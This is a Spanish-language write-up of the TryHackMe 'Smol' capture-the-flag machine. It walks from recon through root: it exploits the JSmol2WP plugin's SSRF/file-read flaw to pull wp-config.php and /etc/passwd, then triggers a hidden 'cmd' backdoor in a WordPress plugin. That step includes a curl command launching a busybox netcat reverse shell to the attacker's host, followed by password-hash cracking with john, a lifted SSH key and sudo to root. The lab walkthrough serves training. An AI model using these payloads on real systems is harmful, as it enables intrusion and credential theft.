---
title: Smol TryHackMe Writeup
tags: [writeup, tryhackme, SSRF, WordPress, JSmol2WP, RCE, john, SUDO]
style: border
color: success
description: ""
---

![logo](../assets/img/smol-tryhackme-writeup/GiFIrsYXUAA8N3u.jpeg)

## Reconocimiento

Lanzamos **nmap** a todos los puertos, con scripts y versiones de software:
```
nmap -p- --min-rate 5000 -sVC -Pn -n 10.10.127.202 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 19:18 CET
Nmap scan report for 10.10.127.202
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.94 seconds
```

**Nota:** Enumeramos el dominio *smol.thm*, insertamos en nuestro fichero *hosts*.

Accedemos al sitio web de *Smol.thm* en el puerto 80, enumeramos un sitio web que simula una plataforma de CTF:
![](../assets/img/smol-tryhackme-writeup/1.png)

También enumeramos los datos del fundador y su correo electrónico, esto podría servirnos para acceder al panel de control de *WordPress*:
![](../assets/img/smol-tryhackme-writeup/2.png)

Efectivamente, el usuario es válido, por lo que solo nos haría falta conseguir la contraseña asociada:
![](../assets/img/smol-tryhackme-writeup/3.png)

Lanzamos un escaneo con **WPScan**, con la idea de encontrar plugins vulnerables, restos de usuarios y otro tipo de información que nos pudiera servir.

Logramos enumerar un SSRF en el plugin "*JSmol2WP*", curiosamente el nombre de la máquina se llama igual, y no creo en casualidades :D
```
wpscan --url http://www.smol.thm -e u,ap --api-token ************************
<SNIP>
[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

```

## Explotación
Accedemos al enlace, dentro tenemos una prueba de concepto para verificar la vulnerabilidad:
![](../assets/img/smol-tryhackme-writeup/4.png)

Llamamos al fichero *wp-config.php* y conseguimos las credenciales de la base de datos:
![](../assets/img/smol-tryhackme-writeup/5.png)

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

También enumeramos los usuarios unix, con la intención de enumerar ficheros relevantes como la clave privada SSH:
![](../assets/img/smol-tryhackme-writeup/6.png)

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../../../../../../../../etc/passwd
```

Reutilizamos las credenciales del fichero y logramos acceder al WordPress:
![](../assets/img/smol-tryhackme-writeup/7.png)

Tenemos pocas opciones en el WordPress, revisando las publicaciones, encontramos uno privado que incluye una lista de prioridades y problemas que afectan al sitio:
![](../assets/img/smol-tryhackme-writeup/8.png)

Seguimos la lista, empezamos por el plugin "*Hello Dolly*", aprovechamos el SSRF para cargar el contenido del fichero, logramos identificar una puerta trasera en el aplicativo:
![](../assets/img/smol-tryhackme-writeup/9.png)

Si decodificamos en hexadecimal, lograremos obtener "*cmd*":
```
\143 corresponde al carácter "c".
\155 corresponde al carácter "m".
\x64 corresponde al carácter "d".
```
Hacemos una pequeña prueba, y logramos explotar el RCE:
![](../assets/img/smol-tryhackme-writeup/10.png)

Nos ponemos en escucha al puerto 443, ejecutamos el siguiente comando y logramos acceder a la máquina:
```
curl "http://www.smol.thm/wp-admin/?cmd=busybox%20nc%2010.9.3.149%20443%20-e%20sh"
```

#### Reverse shell
```
nc -nvlp 443        
listening on [any] 443 ...
connect to [10.9.3.149] from (UNKNOWN) [10.10.127.202] 38000
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Intentamos encontrar el fichero user.txt pero sin éxito, probamos la contraseña sobre todos los usuarios unix, pero tampoco es funcional.

Recordamos que tenemos acceso a **MySQL**, nos conectamos y extraemos todos los *hashes*, con la idea de crackearlos e intentar reutilizar la contraseña con algún usuario:

```
mysql> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH******************KdX.        |
| wpuser     | $P$Bf*************BVh2Z1/E.        |
| think      | $P$BO****************k2n0d/        |
| gege       | $P$B1U****************b3PX1        |
| diego      | $P$BWF******************wv1        |
| xavi       | $P$BB4z****************cql1        |
+------------+------------------------------------+
6 rows in set (0.00 sec)
```

Lanzamos **john** con el diccionario de *rockyou* y conseguimos crackear uno de los hashes:
```
john files/users.hashes --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
************** (?)
```

Reutilizamos la contraseña sobre el usuario *Diego* y logramos leer la flag de usuario:
```
www-data@smol:/home$ su diego
Password: 
diego@smol:/home$ id
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
diego@smol:/home$ ls -lna
total 24
drwxr-xr-x  6    0    0 4096 Aug 16  2023 .
drwxr-xr-x 18    0    0 4096 Mar 29  2024 ..
drwxr-x---  2 1002 1005 4096 Aug 18  2023 diego
drwxr-x---  2 1003 1005 4096 Aug 18  2023 gege
drwxr-x---  5 1000 1005 4096 Jan 12  2024 think
drwxr-x---  2 1001 1005 4096 Aug 18  2023 xavi
diego@smol:/home$ cd diego/
diego@smol:~$ ls -lna
total 24
drwxr-x--- 2 1002 1005 4096 Aug 18  2023 .
drwxr-xr-x 6    0    0 4096 Aug 16  2023 ..
lrwxrwxrwx 1    0    0    9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1002 1002  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 1002 1002 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 1002 1002  807 Feb 25  2020 .profile
-rw-r--r-- 1    0    0   33 Aug 16  2023 user.txt
lrwxrwxrwx 1    0    0    9 Aug 18  2023 .viminfo -> /dev/null
diego@smol:~$ cat user.txt 
********************
```

## Escalada de privilegios
Revisando en los home de los usuarios, encontramos una copia de seguridad de *WordPress*, pero no tenemos acceso con el actual usuario y requerimos acceso con el usuario *gege*:
```
diego@smol:/home/gege$ ls -lna
total 31532
drwxr-x--- 2 1003 1005     4096 Aug 18  2023 .
drwxr-xr-x 6    0    0     4096 Aug 16  2023 ..
lrwxrwxrwx 1    0    0        9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1003 1003      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 1003 1003     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 1003 1003      807 Feb 25  2020 .profile
lrwxrwxrwx 1    0    0        9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1    0 1003 32266546 Aug 16  2023 wordpress.old.zip
diego@smol:/home/gege$ strings wordpress.old.zip 
strings: wordpress.old.zip: Permission denied
diego@smol:/home/gege$ ll wordpress.old.zip 
-rwxr-x--- 1 root gege 32266546 Aug 16  2023 wordpress.old.zip*
```

Continuamos revisando el resto de directorios, logramos leer la clave privada **SSH** del usuario *think*:
```
diego@smol:/home/gege$ cd ..
diego@smol:/home$ ls
diego  gege  think  xavi
diego@smol:/home$ cd think/
diego@smol:/home/think$ ls -lna
total 32
drwxr-x--- 5 1000 1005 4096 Jan 12  2024 .
drwxr-xr-x 6    0    0 4096 Aug 16  2023 ..
lrwxrwxrwx 1    0    0    9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Jun  2  2023 .bashrc
drwx------ 2 1000 1000 4096 Jan 12  2024 .cache
drwx------ 3 1000 1000 4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 1000 1000  807 Jun  2  2023 .profile
drwxr-xr-x 2 1000 1000 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1    0    0    9 Aug 18  2023 .viminfo -> /dev/null
diego@smol:/home/think$ cd .ssh/
diego@smol:/home/think/.ssh$ ls -lna
total 20
drwxr-xr-x 2 1000 1000 4096 Jun 21  2023 .
drwxr-x--- 5 1000 1005 4096 Jan 12  2024 ..
-rwxr-xr-x 1 1000 1000  572 Jun 21  2023 authorized_keys
-rwxr-xr-x 1 1000 1000 2602 Jun 21  2023 id_rsa
-rwxr-xr-x 1 1000 1000  572 Jun 21  2023 id_rsa.pub
diego@smol:/home/think/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
BRQZtfjMvJ44sj9Oi4aE
81DXo7MfGm0bSFAAAAEnRoaW5rQHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
diego@smol:/home/think/.ssh$ 
```

Nos conectamos por **SSH** con el usuario *think*, vemos que pertenecemos al grupo *dev* e *internal*: 
```
ssh think@smol.thm -i files/think-id_rsa  
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 28 Jan 2025 06:39:58 PM UTC

  System load:  0.01              Processes:             126
  Usage of /:   56.9% of 9.75GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for ens5: 10.10.29.247
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

162 updates can be applied immediately.
125 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jan 28 18:27:14 2025 from 10.9.3.149
think@smol:~$ ls -lna
total 32
drwxr-x--- 5 1000 1005 4096 Jan 12  2024 .
drwxr-xr-x 6    0    0 4096 Aug 16  2023 ..
lrwxrwxrwx 1    0    0    9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Jun  2  2023 .bashrc
drwx------ 2 1000 1000 4096 Jan 12  2024 .cache
drwx------ 3 1000 1000 4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 1000 1000  807 Jun  2  2023 .profile
drwxr-xr-x 2 1000 1000 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1    0    0    9 Aug 18  2023 .viminfo -> /dev/null
think@smol:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
think@smol:~$ 
```

Lanzamos el script *lse.sh* y enumeramos una copia de seguridad de *WordPress*, pero no contamos con permisos de *root*:
```
[!] fst190 Can we read any backup?......................................... yes!
---
-rw-r--r-- 1 root root 291970 Mar 29  2024 /opt/wp_backup.sql
```

Leemos el contenido del fichero *wp_backup.sql*, logramos identificar los diferentes hashes de la copia de seguridad:
```
--
-- Dumping data for table `wp_users`
--

LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES (1,'admin','$P$Bv******************aACL1','admin','admin@smol.thm','http://192.168.204.139','2023-08-16 06:58:30','',0,'admin'),(2,'wpuser','$P$BfZj******************/E.','wp','wp@smol.thm','http://smol.thm','2023-08-16 11:04:07','',0,'wordpress user'),(3,'think','$P$B0******************b7Vd/','think','josemlwdf@smol.thm','http://smol.thm','2023-08-16 15:01:02','',0,'Jose Mario Llado Marti'),(4,'gege','$P$Bs******************0m1','gege','gege@smol.thm','http://smol.thm','2023-08-17 20:18:50','',0,'gege'),(5,'diego','$P$BW******************wv1','diego','diego@smol.thm','http://smol.thm','2023-08-17 20:19:15','',0,'diego'),(6,'xavi','$P$Bv******************qJZCN/','xavi','xavi@smol.thm','http://smol.thm','2023-08-17 20:20:01','',0,'xavi');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
```

Con el anterior hallazgo, intentamos crackear la de los usuarios restantes *Gege* y *Xavi*, con la intención de escalar privilegios, así que volvemos a utilizar **john** y el diccionario **rockyou**, finalmente conseguimos la contraseña de *Gege*:
```
john gege.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*********************** (?)     
1g 0:00:04:45 DONE (2025-01-28 19:50) 0.003499g/s 26669p/s 26669c/s 26669C/s herochoi..hero224
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```

Aquí detectamos un bug en la máquina, y es que es posible pasar al usuario gege sin la contraseña (Un golpe de "suerte" ;)):
```
think@smol:~$ su gege
gege@smol:/home$ cd gege/
gege@smol:~$ ls -lna
total 31532
drwxr-x--- 2 1003 1005     4096 Aug 18  2023 .
drwxr-xr-x 6    0    0     4096 Aug 16  2023 ..
lrwxrwxrwx 1    0    0        9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1003 1003      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 1003 1003     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 1003 1003      807 Feb 25  2020 .profile
lrwxrwxrwx 1    0    0        9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1    0 1003 32266546 Aug 16  2023 wordpress.old.zip
```

Además, realizamos la comprobación de la contraseña, y al parecer no es válida :D
```
gege@smol:/home/think$ sudo -l
[sudo] password for gege: 
Sorry, try again.
[sudo] password for gege: 
Sorry, try again.
[sudo] password for gege: 
sudo: 2 incorrect password attempts
```

Descargamos el fichero *wordpress.old.zip* e intentamos descomprimir, vemos que el fichero requiere de contraseña:
```
unzip wordpress.old.zip 
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password: 
```

Probamos con la contraseña que hemos crackeado de *gege* y funciona!:
```
ls -lna
total 240
drwxr-x---  5 1000 1000  4096 Aug 16  2023 .
drwxrwxr-x  3 1000 1000  4096 Jan 28 19:57 ..
-rw-r--r--  1 1000 1000   523 Aug 16  2023 .htaccess
-rw-r--r--  1 1000 1000   405 Aug 16  2023 index.php
-rw-r--r--  1 1000 1000 19915 Aug 16  2023 license.txt
-rw-r--r--  1 1000 1000  7399 Aug 16  2023 readme.html
-rw-r--r--  1 1000 1000  7211 Aug 16  2023 wp-activate.php
drwxr-xr-x  9 1000 1000  4096 Aug 16  2023 wp-admin
-rw-r--r--  1 1000 1000   351 Aug 16  2023 wp-blog-header.php
-rw-r--r--  1 1000 1000  2323 Aug 16  2023 wp-comments-post.php
-rw-r--r--  1 1000 1000  2994 Aug 16  2023 wp-config.php
drwxr-xr-x  7 1000 1000  4096 Aug 16  2023 wp-content
-rw-r--r--  1 1000 1000  5638 Aug 16  2023 wp-cron.php
drwxr-xr-x 27 1000 1000 12288 Aug 16  2023 wp-includes
-rw-r--r--  1 1000 1000  2502 Aug 16  2023 wp-links-opml.php
-rw-r--r--  1 1000 1000  3927 Aug 16  2023 wp-load.php
-rw-r--r--  1 1000 1000 49441 Aug 16  2023 wp-login.php
-rw-r--r--  1 1000 1000  8537 Aug 16  2023 wp-mail.php
-rw-r--r--  1 1000 1000 25602 Aug 16  2023 wp-settings.php
-rw-r--r--  1 1000 1000 34385 Aug 16  2023 wp-signup.php
-rw-r--r--  1 1000 1000  4885 Aug 16  2023 wp-trackback.php
-rw-r--r--  1 1000 1000  3236 Aug 16  2023 xmlrpc.php
```

Leemos el contenido del fichero *wp-config.php*, y encontramos unas credenciales del usuario *Xavi*:
![](../assets/img/smol-tryhackme-writeup/11.png)

Nos autenticamos como *Xavi*, vemos si existen ficheros relevantes, revisamos si tenemos permisos de **SUDO**:
```
gege@smol:~$ su xavi
Password: 
xavi@smol:/home/gege$ id
uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
xavi@smol:/home/gege$ cd ..
xavi@smol:/home$ cd xavi/
xavi@smol:~$ ls -lna
total 20
drwxr-x--- 2 1001 1005 4096 Aug 18  2023 .
drwxr-xr-x 6    0    0 4096 Aug 16  2023 ..
lrwxrwxrwx 1    0    0    9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1001 1001  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 1001 1001 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 1001 1001  807 Feb 25  2020 .profile
lrwxrwxrwx 1    0    0    9 Aug 18  2023 .viminfo -> /dev/null
xavi@smol:~$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

Y para finalizar, invocamos con **SUDO** una **BASH** para ganar acceso como *root*, y leemos la última flag:
```
xavi@smol:~$ sudo bash
root@smol:/home/xavi$ cat /root/root.txt 
**********************
root@smol:/home/xavi$ 
```

¡Hasta la próxima! ¡Que la "*suerte*" os acompañe!